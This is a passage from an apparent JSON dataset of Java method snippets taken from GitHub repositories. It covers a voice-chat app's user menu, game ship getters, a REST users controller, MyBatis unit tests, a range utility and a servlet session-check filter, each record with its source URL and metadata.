menu.findItem(R.id.context_local_mute).setVisible(!self);\n        menu.findItem(R.id.context_ignore_messages).setVisible(!self);\n\n        // TODO info\n//            informationItem.enabled = (((perms & (Permissions.Write | Permissions.Register))) > 0 || (channelPermissions & (Permissions.Write | Permissions.Enter)) > 0 || (mUser.getSessionId() == mService.getSessionId()));\n\n        // Highlight toggles\n        menu.findItem(R.id.context_mute).setChecked(mUser.isMuted() || mUser.isSuppressed());\n        menu.findItem(R.id.context_deafen).setChecked(mUser.isDeafened());\n        menu.findItem(R.id.context_priority).setChecked(mUser.isPrioritySpeaker());\n        menu.findItem(R.id.context_local_mute).setChecked(mUser.isLocalMuted());\n        menu.findItem(R.id.context_ignore_messages).setChecked(mUser.isLocalIgnored());\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/channel/UserMenu.java", "stars": "9", "class_props": {"extends": null, "implements": ["PermissionsPopupMenu", "PopupMenu"], "modifiers": ["public"]}}, {"id": 56189, "method_name": "onMenuItemClick", "class_name": "UserMenu", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onMenuItemClick(final MenuItem menuItem) {\n        switch (menuItem.getItemId()) {\n            case R.id.context_ban:\n            case R.id.context_kick:\n                AlertDialog.Builder alertBuilder = new AlertDialog.Builder(mContext);\n                alertBuilder.setTitle(R.string.user_menu_kick);\n                final EditText reasonField = new EditText(mContext);\n                reasonField.setHint(R.string.hint_reason);\n                alertBuilder.setView(reasonField);\n                alertBuilder.setPositiveButton(R.string.user_menu_kick, new DialogInterface.OnClickListener() {\n                    @Override\n                    public void onClick(DialogInterface dialog, int which) {\n                        mService.kickBanUser(mUser.getSession(),\n                                reasonField.getText().toString(), menuItem.getItemId() == R.id.context_ban);\n                    }\n                });\n                alertBuilder.setNegativeButton(android.R.string.cancel, null);\n                alertBuilder.show();\n                break;\n            case R.id.context_mute:\n                mService.setMuteDeafState(mUser.getSession(), !(mUser.isMuted() || mUser.isSuppressed()), mUser.isDeafened());\n                break;\n            case R.id.context_deafen:\n                mService.setMuteDeafState(mUser.getSession(), mUser.isMuted(), !mUser.isDeafened());\n                break;\n            case R.id.context_move:\n                showChannelMoveDialog();\n                break;\n            case R.id.context_priority:\n                mService.setPrioritySpeaker(mUser.getSession(), !mUser.isPrioritySpeaker());\n                break;\n            case R.id.context_local_mute:\n                mUser.setLocalMuted(!mUser.isLocalMuted());\n                mStateListener.onLocalUserStateUpdated(mUser);\n                break;\n            case R.id.context_ignore_messages:\n                mUser.setLocalIgnored(!mUser.isLocalIgnored());\n                mStateListener.onLocalUserStateUpdated(mUser);\n                break;\n            case R.id.context_change_comment:\n                showUserComment(true);\n                break;\n            case R.id.context_view_comment:\n                showUserComment(false);\n                break;\n            case R.id.context_reset_comment:\n                new AlertDialog.Builder(mContext)\n                        .setMessage(mContext.getString(R.string.confirm_reset_comment, mUser.getName()))\n                        .setPositiveButton(R.string.confirm, new DialogInterface.OnClickListener() {\n                            @Override\n                            public void onClick(DialogInterface dialog, int which) {\n                                mService.setUserComment(mUser.getSession(), \"\");\n                            }\n                        })\n                        .setNegativeButton(android.R.string.cancel, null)\n                        .show();\n                break;\n//                case R.id.context_info:\n//                    break;\n            case R.id.context_register:\n                mService.registerUser(mUser.getSession());\n                break;\n            default:\n                return false;\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/channel/UserMenu.java", "stars": "9", "class_props": {"extends": null, "implements": ["PermissionsPopupMenu", "PopupMenu"], "modifiers": ["public"]}}, {"id": 56190, "method_name": "showUserComment", "class_name": "UserMenu", "params": ["boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showUserComment(final boolean edit) {\n        Bundle args = new Bundle();\n        args.putInt(\"session\", mUser.getSession());\n        args.putString(\"comment\", mUser.getComment());\n        args.putBoolean(\"editing\", edit);\n        UserCommentFragment fragment = (UserCommentFragment) Fragment.instantiate(mContext, UserCommentFragment.class.getName(), args);\n        fragment.show(mFragmentManager, UserCommentFragment.class.getName());\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/channel/UserMenu.java", "stars": "9", "class_props": {"extends": null, "implements": ["PermissionsPopupMenu", "PopupMenu"], "modifiers": ["public"]}}, {"id": 56191, "method_name": "showChannelMoveDialog", "class_name": "UserMenu", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showChannelMoveDialog() {\n        AlertDialog.Builder adb = new AlertDialog.Builder(mContext);\n        adb.setTitle(R.string.user_menu_move);\n        final List<IChannel> channels = ModelUtils.getChannelList(mService.getRootChannel());\n        final CharSequence[] channelNames = new CharSequence[channels.size()];\n        for (int i = 0; i < channels.size(); i++) {\n            channelNames[i] = channels.get(i).getName();\n        }\n        adb.setItems(channelNames, new DialogInterface.OnClickListener() {\n            @Override\n            public void onClick(DialogInterface dialog, int which) {\n                IChannel channel = channels.get(which);\n                mService.moveUserToChannel(mUser.getSession(), channel.getId());\n            }\n        });\n        adb.show();\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/channel/UserMenu.java", "stars": "9", "class_props": {"extends": null, "implements": ["PermissionsPopupMenu", "PopupMenu"], "modifiers": ["public"]}}, {"id": 56192, "method_name": "showPopup", "class_name": "UserMenu", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showPopup(View anchor) {\n        PermissionsPopupMenu popupMenu = new PermissionsPopupMenu(mContext, anchor,\n                R.menu.context_user, this, this, mUser.getChannel(), mService);\n        popupMenu.show();\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/channel/UserMenu.java", "stars": "9", "class_props": {"extends": null, "implements": ["PermissionsPopupMenu", "PopupMenu"], "modifiers": ["public"]}}, {"id": 56193, "method_name": "name", "class_name": "ShipSpecialBeamFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String name()           { return tech().name();  }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialBeamFocus.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56194, "method_name": "desc", "class_name": "ShipSpecialBeamFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String desc()           { return tech().brief(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialBeamFocus.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56195, "method_name": "tech", "class_name": "ShipSpecialBeamFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TechBeamFocus", "snippet": "    public TechBeamFocus tech()    { return (TechBeamFocus) super.tech(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialBeamFocus.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56196, "method_name": "beamRangeBonus", "class_name": "ShipSpecialBeamFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int beamRangeBonus() { return tech().rangeAdj; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialBeamFocus.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56197, "method_name": "beamShieldMod", "class_name": "ShipSpecialBeamFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float beamShieldMod()  { return tech().shieldAdj; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/ships/ShipSpecialBeamFocus.java", "stars": "74", "class_props": {"extends": "ShipSpecial", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56198, "method_name": "getAllUsers", "class_name": "UsersController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<UserResponse>", "snippet": "    public List<UserResponse> getAllUsers() {\n        return usersReadService.getUsers().stream()\n                .map(dtoConverter::convert)\n                .collect(toList());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/UsersController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56199, "method_name": "getUser", "class_name": "UsersController", "params": ["User", "UUID"], "throws": null, "modifiers": ["public"], "return_type": "UserResponse", "snippet": "    public UserResponse getUser(User requestingUser, @PathVariable UUID userId) {\n        return dtoConverter.convert(usersReadService.getById(userId));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/UsersController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56200, "method_name": "updateUser", "class_name": "UsersController", "params": ["User", "UUID", "UpdateUserRequest"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUser(User requestingUser, @PathVariable UUID userId, @RequestBody @Valid UpdateUserRequest request) {\n        usersService.updateUser(requestingUser.getId(), userId,\n                request.getEmail(), request.getDisplayName(), request.getPassword());\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/api/src/main/java/engineering/everest/lhotse/api/rest/controllers/UsersController.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56201, "method_name": "initialize", "class_name": "BaseController", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL location, ResourceBundle resources) {\n        this.resourceBundle = resources;\n        this.location = location;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56202, "method_name": "init", "class_name": "BaseController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        //todo override\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56203, "method_name": "getData", "class_name": "BaseController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "D", "snippet": "    public D getData() {\n        return data;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56204, "method_name": "setData", "class_name": "BaseController", "params": ["D"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(D data) {\n        this.data = data;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56205, "method_name": "getStage", "class_name": "BaseController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stage", "snippet": "    public Stage getStage() {\n        return stage;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56206, "method_name": "setStage", "class_name": "BaseController", "params": ["Stage"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStage(Stage stage) {\n        this.stage = stage;\n    }", "url": "https://raw.githubusercontent.com/GZYangKui/openjfx-database/master/app/src/main/java/com/openjfx/database/app/BaseController.java", "stars": "18", "class_props": {"extends": null, "implements": ["Initializable"], "modifiers": ["public", "abstract"]}}, {"id": 56207, "method_name": "main", "class_name": "FlowWhile", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint sum = 0;\n\t\tint m = 20;\n\t\tint n = 100;\n\t\t// FIXME: \u4f7f\u7528while\u8ba1\u7b97M+...+N:\n\t\twhile (m<=n) {//\u6ee1\u8db3\u6761\u4ef6 \u8fdb\u5165\u5faa\u73af \u5148\u5224\u65ad \u540e\u6267\u884c\n\t\t\tsum = sum + m;\n\t\t\tm++;\n\t\t}\n\t\tSystem.out.println(sum);\n\t}", "url": "https://raw.githubusercontent.com/IzzyPrime/JavaWorkspace/master/JavaPractice/part1/src/com/flow/javapractice/FlowWhile.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56208, "method_name": "runIfIdle", "class_name": "IdleTask", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean runIfIdle() {\n        boolean idle = idleRunLimit > System.currentTimeMillis();\n        if (TM.isFullLogEnabled()) {\n            TMLog.d(TAG, getName() + \"run if idle ? \" + idle);\n        }\n        return idle;\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/IdleTask.java", "stars": "50", "class_props": {"extends": "Task", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56209, "method_name": "doAfterTask", "class_name": "IdleTask", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void doAfterTask() {\n        super.doAfterTask();\n        TaskWrapper wrapper = getTaskWrapper();\n        if (wrapper != null && Looper.myLooper() == Looper.getMainLooper() && runIfIdle()) {\n            Task request = TaskContainer.getInstance().offerTaskInIdleState(false);\n            if (request != null) {\n                wrapper.addPendingTask(request);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/IdleTask.java", "stars": "50", "class_props": {"extends": "Task", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56210, "method_name": "updateIdleOffset", "class_name": "IdleTask", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateIdleOffset(int offset) {\n        if (offset == 0) {\n            idleRunLimit = Long.MAX_VALUE;\n        } else {\n            idleRunLimit = System.currentTimeMillis() + offset;\n        }\n        TMLog.d(TAG, \"set idleTask offset \" + idleRunLimit);\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/IdleTask.java", "stars": "50", "class_props": {"extends": "Task", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56211, "method_name": "postPending", "class_name": "IdleTask", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void postPending() {\n        if (taskState == STATE_IDLE) {\n            // when call need Task; in case of running more than once\n            setDelay(Integer.MAX_VALUE);\n            TaskManager.getInstance().enqueue(this);\n        }\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/IdleTask.java", "stars": "50", "class_props": {"extends": "Task", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56212, "method_name": "setUp", "class_name": "ForEachTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/foreach/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/foreach/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56213, "method_name": "shouldGetAUser", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User testProfile = new User();\n      testProfile.setId(2);\n      User friendProfile = new User();\n      friendProfile.setId(6);\n      List<User> friendList = new ArrayList<>();\n      friendList.add(friendProfile);\n      testProfile.setFriendList(friendList);\n      User user = mapper.getUser(testProfile);\n      Assertions.assertEquals(\"User6\", user.getName());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56214, "method_name": "shouldHandleComplexNullItem", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldHandleComplexNullItem() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user1 = new User();\n      user1.setId(2);\n      user1.setName(\"User2\");\n      List<User> users = new ArrayList<>();\n      users.add(user1);\n      users.add(null);\n      int count = mapper.countByUserList(users);\n      Assertions.assertEquals(1, count);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56215, "method_name": "shouldHandleMoreComplexNullItem", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldHandleMoreComplexNullItem() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user1 = new User();\n      User bestFriend = new User();\n      bestFriend.setId(5);\n      user1.setBestFriend(bestFriend);\n      List<User> users = new ArrayList<>();\n      users.add(user1);\n      users.add(null);\n      int count = mapper.countByBestFriend(users);\n      Assertions.assertEquals(1, count);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56216, "method_name": "nullItemInContext", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void nullItemInContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user1 = new User();\n      user1.setId(3);\n      List<User> users = new ArrayList<>();\n      users.add(user1);\n      users.add(null);\n      String name = mapper.selectWithNullItemCheck(users);\n      Assertions.assertEquals(\"User3\", name);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56217, "method_name": "shouldReportMissingPropertyName", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldReportMissingPropertyName() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      when(() -> mapper.typoInItemProperty(Collections.singletonList(new User())));\n      then(caughtException()).isInstanceOf(PersistenceException.class)\n        .hasMessageContaining(\"There is no getter for property named 'idd' in 'class org.apache.ibatis.submitted.foreach.User'\");\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56218, "method_name": "shouldRemoveItemVariableInTheContext", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldRemoveItemVariableInTheContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      int result = mapper.itemVariableConflict(5, Arrays.asList(1, 2), Arrays.asList(3, 4));\n      Assertions.assertEquals(5, result);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56219, "method_name": "shouldRemoveIndexVariableInTheContext", "class_name": "ForEachTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldRemoveIndexVariableInTheContext() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      int result = mapper.indexVariableConflict(4, Arrays.asList(6, 7), Arrays.asList(8, 9));\n      Assertions.assertEquals(4, result);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/foreach/ForEachTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 56220, "method_name": "getStart", "class_name": "Range", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getStart() {\n        return start;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Instantiable/Data/Math/Range.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56221, "method_name": "getEnd", "class_name": "Range", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getEnd() {\n        return end;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Instantiable/Data/Math/Range.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56222, "method_name": "getMid", "class_name": "Range", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getMid() {\n        return (start + end) / 2.0f;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Instantiable/Data/Math/Range.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56223, "method_name": "clamp", "class_name": "Range", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float clamp(float num) {\n        if (num > end)\n            return end;\n        return Math.max(num, start);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Instantiable/Data/Math/Range.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56224, "method_name": "in", "class_name": "Range", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean in(double check) {\n        return start <= check && check <= end;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Instantiable/Data/Math/Range.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56225, "method_name": "shouldSetParameter", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    TYPE_HANDLER.setParameter(ps, 1, SQL_TIME, null);\n    verify(ps).setTimestamp(1, SQL_TIME);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56226, "method_name": "shouldGetResultFromResultSetByName", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    when(rs.getTimestamp(\"column\")).thenReturn(SQL_TIME);\n    assertEquals(SQL_TIME, TYPE_HANDLER.getResult(rs, \"column\"));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56227, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    // Unnecessary\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56228, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    when(rs.getTimestamp(1)).thenReturn(SQL_TIME);\n    assertEquals(SQL_TIME, TYPE_HANDLER.getResult(rs, 1));\n    verify(rs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56229, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    // Unnecessary\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56230, "method_name": "shouldGetResultFromCallableStatement", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    when(cs.getTimestamp(1)).thenReturn(SQL_TIME);\n    assertEquals(SQL_TIME, TYPE_HANDLER.getResult(cs, 1));\n    verify(cs, never()).wasNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56231, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "SqlTimetampTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    // Unnecessary\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/SqlTimetampTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 56232, "method_name": "destroy", "class_name": "AccessControlFilter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void destroy() {\n\t}", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/demos/001-crud-books-mvc-servlets-jstl-jpa/src/main/java/br/me/crudbooks/web/security/AccessControlFilter.java", "stars": "2", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 56233, "method_name": "doFilter", "class_name": "AccessControlFilter", "params": ["ServletRequest", "ServletResponse", "FilterChain"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void doFilter(ServletRequest request, ServletResponse response,\n\n\tFilterChain chain) throws IOException, ServletException {\n\n            HttpServletRequest req = (HttpServletRequest) request;\n            HttpServletResponse res = (HttpServletResponse) response;\n            RequestDispatcher rd;\n\n            HttpSession session = req.getSession();\n            if (session == null || session.getAttribute(\"usuario\") == null){\n                \n                //redirecionamento para pagina de aviso de sess\u00e3o expirada\n                String paginaDeAviso = \"/WEB-INF/session.jsp\";\n                rd = request.getRequestDispatcher(paginaDeAviso);  \n                rd.forward(request, response); \n                \n            }\n            else{\n                \n                chain.doFilter(req, res);\n                \n            }\n\t}", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/demos/001-crud-books-mvc-servlets-jstl-jpa/src/main/java/br/me/crudbooks/web/security/AccessControlFilter.java", "stars": "2", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 56234, "method_name": "getUrlBase", "class_name": "AccessControlFilter", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getUrlBase(HttpServletRequest req) {\n            String nomeAplic = req.getContextPath();\n            String url = req.getRequestURL()+\"\";\n            String urlSufixo = url.substring(url.indexOf(nomeAplic));\n            return url.replace(urlSufixo, \"\")+nomeAplic;\n\t}", "url": "https://raw.githubusercontent.com/marcoseduardoss/mini-mvc/master/demos/001-crud-books-mvc-servlets-jstl-jpa/src/main/java/br/me/crudbooks/web/security/AccessControlFilter.java", "stars": "2", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 56235, "method_name": "init", "class_name": "AccessControlFilter", "params": ["FilterConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic 